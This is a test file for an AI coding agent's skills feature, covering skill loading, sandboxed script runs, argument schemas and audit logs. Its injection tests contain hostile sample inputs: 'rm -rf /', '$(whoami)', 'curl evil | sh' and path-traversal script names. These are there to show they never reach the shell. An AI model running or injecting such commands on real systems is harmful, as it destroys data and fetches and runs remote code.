import { describe, expect, it } from "vitest";
import { createSkillTools, loadSkills, skillsIndex, type SkillExec, type SkillFs } from "../src/skills";

/** In-memory filesystem: paths ending in "/" are not needed, a folder exists if any file is under it. */
function memfs(files: Record<string, string>): SkillFs & { files: Record<string, string>; removed: string[] } {
  const removed: string[] = [];
  const fs = {
    files,
    removed,
    read: async (p: string) => files[p] ?? null,
    list: async (dir: string) => {
      const prefix = dir.replace(/\/$/, "") + "/";
      const names = new Set<string>();
      for (const k of Object.keys(files)) if (k.startsWith(prefix)) names.add(k.slice(prefix.length).split("/")[0]!);
      if (names.size === 0) throw new Error("no such folder");
      return [...names];
    },
    write: async (p: string, c: string) => void (files[p] = c),
    remove: async (p: string) => (removed.push(p), void delete files[p]),
  };
  return fs;
}

const ROOT = "/ws";
const SK = `${ROOT}/.forge/skills`;
const seed = () => ({
  [`${SK}/release/SKILL.md`]: "---\ndescription: Cut a release\n---\n# Release\nRun the checks, then tag.\n",
  [`${SK}/release/bump.js`]: "// bumps the version",
  [`${SK}/release/notes.py`]: "# notes",
  [`${SK}/release/CHECKLIST.md`]: "- [ ] tests",
  [`${SK}/release/data.json`]: "{}",
  [`${SK}/lint-fix/SKILL.md`]: "# Fix lint\nRun the linter and fix what it reports.\n",
  [`${SK}/not-a-skill/readme.txt`]: "no SKILL.md here",
  [`${SK}/has space/SKILL.md`]: "invalid folder name",
});

describe("loading skills", () => {
  it("reads description, body, runnable scripts and reference files", async () => {
    const skills = await loadSkills(memfs(seed()), SK);
    expect(skills.map((s) => s.name)).toEqual(["lint-fix", "release"]);
    const r = skills.find((s) => s.name === "release")!;
    expect(r.description).toBe("Cut a release");
    expect(r.body).toContain("Run the checks, then tag.");
    expect(r.scripts).toEqual(["bump.js", "notes.py"]);
    expect(r.files).toEqual(["CHECKLIST.md", "data.json"]);
    expect(skills.find((s) => s.name === "lint-fix")!.description).toBe("Fix lint"); // first line when no front matter
  });

  it("skips folders without SKILL.md and folder names that are not valid", async () => {
    const names = (await loadSkills(memfs(seed()), SK)).map((s) => s.name);
    expect(names).not.toContain("not-a-skill");
    expect(names).not.toContain("has space");
  });

  it("returns nothing when there is no skills folder", async () => {
    expect(await loadSkills(memfs({}), SK)).toEqual([]);
  });

  it("builds a compact index that mentions scripts", async () => {
    const idx = skillsIndex(await loadSkills(memfs(seed()), SK));
    expect(idx).toContain("- release: Cut a release (has scripts: bump.js, notes.py)");
    expect(idx).toContain("- lint-fix: Fix lint");
  });
});

function tools(opts: { exec?: SkillExec; sandbox?: boolean; files?: Record<string, string>; audit?: { name: string; detail?: string }[] } = {}) {
  const fs = memfs(opts.files ?? seed());
  const list = createSkillTools({ root: ROOT, fs, skills: () => loadSkills(fs, SK), exec: opts.exec, sandbox: () => opts.sandbox ?? true, audit: (e) => opts.audit?.push(e) });
  return { fs, byName: (n: string) => list.find((t) => t.spec.name === n)!, names: list.map((t) => t.spec.name) };
}
const ctx = { root: ROOT, fs: { readFile: async () => "", readdir: async () => [] } };

describe("use_skill", () => {
  it("returns the instructions and lists scripts and reference files", async () => {
    const out = (await tools({ exec: { run: async () => ({ code: 0, stdout: "", stderr: "", timedOut: false }) } }).byName("use_skill").run({ name: "release" }, ctx)) as string;
    expect(out).toContain("# Skill: release");
    expect(out).toContain("Run the checks, then tag.");
    expect(out).toContain("Bundled scripts (run with run_skill_script):");
    expect(out).toContain("- bump.js");
    expect(out).toContain("- notes.py");
    expect(out).toContain("CHECKLIST.md");
  });

  it("does not advertise scripts when none can be run", async () => {
    const out = (await tools().byName("use_skill").run({ name: "release" }, ctx)) as string;
    expect(out).not.toContain("run_skill_script");
  });

  it("names the available skills when asked for one that does not exist", async () => {
    await expect(tools().byName("use_skill").run({ name: "nope" }, ctx)).rejects.toThrow("Available: lint-fix, release");
  });
});

describe("run_skill_script", () => {
  const ok: SkillExec = { run: async () => ({ code: 0, stdout: "done", stderr: "", timedOut: false }) };

  it("is not offered without an exec backend (instruction-only skills)", () => {
    expect(tools().names).toEqual(["use_skill"]);
    expect(tools({ exec: ok }).names).toEqual(["use_skill", "run_skill_script"]);
  });

  it("is an execute-class tool, so the permission gate decides first", () => {
    expect(tools({ exec: ok }).byName("run_skill_script").spec.class).toBe("execute");
    expect(tools({ exec: ok }).byName("use_skill").spec.class).toBe("read");
  });

  it("runs the script with an interpreter chosen from its extension and the args file as the only argument", async () => {
    const calls: { command: string; cwd: string; sandbox?: boolean }[] = [];
    const t = tools({ exec: { run: async (command, o) => (calls.push({ command, cwd: o.cwd, sandbox: o.sandbox }), { code: 0, stdout: "bumped", stderr: "", timedOut: false }) } });
    const out = (await t.byName("run_skill_script").run({ skill: "release", script: "bump.js", args: { level: "minor" } }, ctx)) as string;
    expect(out).toContain("exit code 0");
    expect(out).toContain("bumped");
    expect(calls[0]!.command).toMatch(/^node "\/ws\/\.forge\/skills\/release\/bump\.js" "\/ws\/\.forge\/skill-runs\/[a-z0-9-]+\.json"$/);
    expect(calls[0]!.cwd).toBe("/ws");
    expect(calls[0]!.sandbox).toBe(true);
    const py = tools({ exec: { run: async (command) => (calls.push({ command, cwd: "", sandbox: undefined }), { code: 0, stdout: "", stderr: "", timedOut: false }) } });
    await py.byName("run_skill_script").run({ skill: "release", script: "notes.py" }, ctx);
    expect(calls.at(-1)!.command.startsWith('python "')).toBe(true);
  });

  it("passes the arguments in a file that exists during the run and is removed afterwards, even if the run fails", async () => {
    let seen: string | undefined;
    const t = tools({ exec: { run: async (command) => ((seen = t.fs.files[/"([^"]*\.json)"$/.exec(command)![1]!]), Promise.reject(new Error("boom"))) } });
    await expect(t.byName("run_skill_script").run({ skill: "release", script: "bump.js", args: { level: "minor", note: "a b" } }, ctx)).rejects.toThrow("boom");
    expect(JSON.parse(seen!)).toEqual({ level: "minor", note: "a b" });
    expect(t.fs.removed).toHaveLength(1);
    expect(Object.keys(t.fs.files).some((k) => k.includes("skill-runs"))).toBe(false);
  });

  it("hostile argument text cannot change the command line (arguments never reach the shell)", async () => {
    const commands: string[] = [];
    const t = tools({ exec: { run: async (c) => (commands.push(c), { code: 0, stdout: "", stderr: "", timedOut: false }) } });
    await t.byName("run_skill_script").run({ skill: "release", script: "bump.js", args: { x: '"; rm -rf / ; echo "', y: "$(whoami) `id` && curl evil | sh" } }, ctx);
    expect(commands[0]).not.toContain("rm -rf");
    expect(commands[0]).not.toContain("curl");
    expect(commands[0]).not.toContain("whoami");
    expect(commands[0]!.match(/"/g)).toHaveLength(4); // exactly the two quoted paths
  });

  it("only runs scripts the skill actually contains: no path tricks, no reference files, no unknown names", async () => {
    const t = tools({ exec: ok });
    for (const script of ["../../../evil.js", "../release/bump.js", "sub/dir.js", "CHECKLIST.md", "data.json", "missing.js", "", "bump.js; whoami"]) {
      await expect(t.byName("run_skill_script").run({ skill: "release", script }, ctx), JSON.stringify(script)).rejects.toThrow(/has no script/);
    }
    await expect(t.byName("run_skill_script").run({ skill: "../x", script: "bump.js" }, ctx)).rejects.toThrow(/no skill named/);
  });

  it("refuses a workspace path that could break out of the quoted command line", async () => {
    const root = "/ws/odd$(name)";
    const fs = memfs({ [`${root}/.forge/skills/s/SKILL.md`]: "# s\nbody", [`${root}/.forge/skills/s/a.js`]: "x" });
    const list = createSkillTools({ root, fs, skills: () => loadSkills(fs, `${root}/.forge/skills`), exec: ok });
    await expect(list.find((x) => x.spec.name === "run_skill_script")!.run({ skill: "s", script: "a.js" }, ctx)).rejects.toThrow("cannot be passed safely");
  });

  it("caps argument size and clamps the timeout", async () => {
    const timeouts: number[] = [];
    const t = tools({ exec: { run: async (_c, o) => (timeouts.push(o.timeoutMs), { code: 0, stdout: "", stderr: "", timedOut: false }) } });
    await expect(t.byName("run_skill_script").run({ skill: "release", script: "bump.js", args: { big: "x".repeat(21_000) } }, ctx)).rejects.toThrow("too large");
    await t.byName("run_skill_script").run({ skill: "release", script: "bump.js", timeout_seconds: 99_999 }, ctx);
    await t.byName("run_skill_script").run({ skill: "release", script: "bump.js" }, ctx);
    expect(timeouts).toEqual([300_000, 60_000]);
  });

  it("reports a timeout and a failing exit code plainly, and respects the sandbox setting", async () => {
    const seenSandbox: (boolean | undefined)[] = [];
    const t = tools({ sandbox: false, exec: { run: async (_c, o) => (seenSandbox.push(o.sandbox), { code: null, stdout: "", stderr: "late", timedOut: true }) } });
    const out = (await t.byName("run_skill_script").run({ skill: "release", script: "bump.js" }, ctx)) as string;
    expect(out).toContain("timed out and was killed");
    expect(out).toContain("late");
    expect(seenSandbox).toEqual([false]);
    const failing = tools({ exec: { run: async () => ({ code: 2, stdout: "", stderr: "bad input", timedOut: false }) } });
    expect(await failing.byName("run_skill_script").run({ skill: "release", script: "bump.js" }, ctx)).toContain("exit code 2");
  });

  it("audits each run, saying whether it was sandboxed", async () => {
    const audit: { name: string; detail?: string }[] = [];
    await tools({ exec: ok, audit }).byName("run_skill_script").run({ skill: "release", script: "bump.js" }, ctx);
    expect(audit.map((a) => `${a.name}: ${a.detail}`)).toEqual(["skill release/bump.js: project skill, sandboxed", "skill release/bump.js: exit 0"]);
  });

  it("tells the model which isolation was used and why a tool might be missing", async () => {
    const sandboxed = tools({ exec: { run: async () => ({ code: 1, stdout: "", stderr: "'node' is not recognized", timedOut: false, sandbox: { mode: "appcontainer", warnings: ["could not grant read access to C:/Program Files/nodejs"] } }) } });
    const out = (await sandboxed.byName("run_skill_script").run({ skill: "release", script: "bump.js" }, ctx)) as string;
    expect(out).toContain("ran in the OS sandbox: workspace only, no network");
    expect(out).toContain("note: could not grant read access to C:/Program Files/nodejs");
    const envOnly = tools({ exec: { run: async () => ({ code: 0, stdout: "", stderr: "", timedOut: false, sandbox: { mode: "env-only" } }) } });
    expect((await envOnly.byName("run_skill_script").run({ skill: "release", script: "bump.js" }, ctx)) as string).toContain("no OS sandbox was available");
    const none = tools({ exec: { run: async () => ({ code: 0, stdout: "", stderr: "", timedOut: false }) } });
    expect((await none.byName("run_skill_script").run({ skill: "release", script: "bump.js" }, ctx)) as string).not.toContain("sandbox");
  });
});

// ---- declared tool schemas, per-user skills ------------------------------------------------------------------------

const BUMP_DECL = JSON.stringify({
  "bump.js": {
    description: "Bump the package version",
    parameters: { type: "object", properties: { level: { type: "string", enum: ["patch", "minor", "major"], description: "how much to bump" }, count: { type: "integer", minimum: 1, maximum: 5 }, dry: { type: "boolean" } }, required: ["level"], additionalProperties: false },
  },
});

describe("declared tool schemas (tools.json)", () => {
  const withDecl = (decl: string) => ({ ...seed(), [`${SK}/release/tools.json`]: decl });
  const ok: SkillExec = { run: async () => ({ code: 0, stdout: "bumped", stderr: "", timedOut: false }) };

  it("reads declarations, keeps tools.json out of the reference files, and shows the usage to the model", async () => {
    const [release] = (await loadSkills(memfs(withDecl(BUMP_DECL)), SK)).filter((s) => s.name === "release");
    expect(release!.declared["bump.js"]!.description).toBe("Bump the package version");
    expect(release!.files).not.toContain("tools.json");
    expect(release!.problems).toEqual([]);
    const out = (await tools({ exec: ok, files: withDecl(BUMP_DECL) }).byName("use_skill").run({ name: "release" }, ctx)) as string;
    expect(out).toContain("- bump.js: Bump the package version | args: level (string, required, one of patch|minor|major): how much to bump; count (integer); dry (boolean)");
    expect(out).toContain("- notes.py"); // an undeclared script is still listed, without a usage
  });

  it("accepts arguments that match, and runs the script", async () => {
    const t = tools({ exec: ok, files: withDecl(BUMP_DECL) });
    expect(await t.byName("run_skill_script").run({ skill: "release", script: "bump.js", args: { level: "minor", count: 2, dry: true } }, ctx)).toContain("bumped");
  });

  it("rejects arguments that do not match, before anything runs, and says what was expected", async () => {
    let ran = 0;
    const t = tools({ exec: { run: async () => (ran++, { code: 0, stdout: "", stderr: "", timedOut: false }) }, files: withDecl(BUMP_DECL) });
    const run = (args: unknown) => t.byName("run_skill_script").run({ skill: "release", script: "bump.js", args }, ctx);
    await expect(run({})).rejects.toThrow('missing required argument "level"');
    await expect(run({ level: "huge" })).rejects.toThrow("must be one of: patch, minor, major");
    await expect(run({ level: 3 })).rejects.toThrow('argument "level" must be a string');
    await expect(run({ level: "patch", count: 1.5 })).rejects.toThrow('"count" must be an integer');
    await expect(run({ level: "patch", count: 9 })).rejects.toThrow("at most 5");
    await expect(run({ level: "patch", surprise: true })).rejects.toThrow('unknown argument "surprise"');
    await expect(run({})).rejects.toThrow("Expected: level (string, required");
    expect(ran).toBe(0);
  });

  it("scripts without a declaration still accept any arguments", async () => {
    const t = tools({ exec: ok, files: withDecl(BUMP_DECL) });
    expect(await t.byName("run_skill_script").run({ skill: "release", script: "notes.py", args: { anything: [1, 2] } }, ctx)).toContain("exit code 0");
  });

  it("reports a broken tools.json instead of ignoring it, and does not enforce what it could not read", async () => {
    for (const bad of ["{not json", "[1,2]", JSON.stringify({ "ghost.js": { description: "x" } }), JSON.stringify({ "bump.js": { parameters: { type: "banana" } } })]) {
      const files = withDecl(bad);
      const [release] = (await loadSkills(memfs(files), SK)).filter((s) => s.name === "release");
      expect(release!.problems.length, bad).toBeGreaterThan(0);
      expect(release!.declared["bump.js"], bad).toBeUndefined();
      const out = (await tools({ exec: ok, files }).byName("use_skill").run({ name: "release" }, ctx)) as string;
      expect(out).toContain("tools.json has problems");
    }
  });
});

describe("per-user skills", () => {
  const USER = "/home/me/.forge/skills";
  const all = () => ({
    ...seed(),
    [`${USER}/standup/SKILL.md`]: "---\ndescription: Write my standup\n---\nSummarise yesterday.",
    [`${USER}/standup/run.js`]: "x",
    [`${USER}/release/SKILL.md`]: "# Mine\nmy own release flow",
  });

  it("loads skills from both folders and marks where each came from", async () => {
    const skills = await loadSkills(memfs(all()), SK, USER);
    expect(skills.map((s) => `${s.name}:${s.source}`)).toEqual(["lint-fix:project", "release:project", "standup:user"]);
    expect(skills.find((s) => s.name === "standup")!.dir).toBe(`${USER}/standup`);
  });

  it("a repository skill wins over a user skill of the same name", async () => {
    const release = (await loadSkills(memfs(all()), SK, USER)).filter((s) => s.name === "release");
    expect(release).toHaveLength(1);
    expect(release[0]!.source).toBe("project");
    expect(release[0]!.body).toContain("Run the checks, then tag.");
  });

  it("works with no user folder at all", async () => {
    expect((await loadSkills(memfs(seed()), SK, "/nowhere")).map((s) => s.name)).toEqual(["lint-fix", "release"]);
  });

  it("runs a user skill's script from its own folder and says in the audit that it is a user skill", async () => {
    const fs = memfs(all());
    const commands: string[] = [];
    const audit: { name: string; detail?: string }[] = [];
    const list = createSkillTools({ root: ROOT, fs, skills: () => loadSkills(fs, SK, USER), exec: { run: async (c) => (commands.push(c), { code: 0, stdout: "", stderr: "", timedOut: false }) }, audit: (e) => audit.push(e) });
    await list.find((t) => t.spec.name === "run_skill_script")!.run({ skill: "standup", script: "run.js" }, ctx);
    expect(commands[0]).toMatch(/^node "\/home\/me\/\.forge\/skills\/standup\/run\.js" "\/ws\/\.forge\/skill-runs\//);
    expect(audit.some((a) => a.detail?.includes("user skill"))).toBe(true);
  });
});
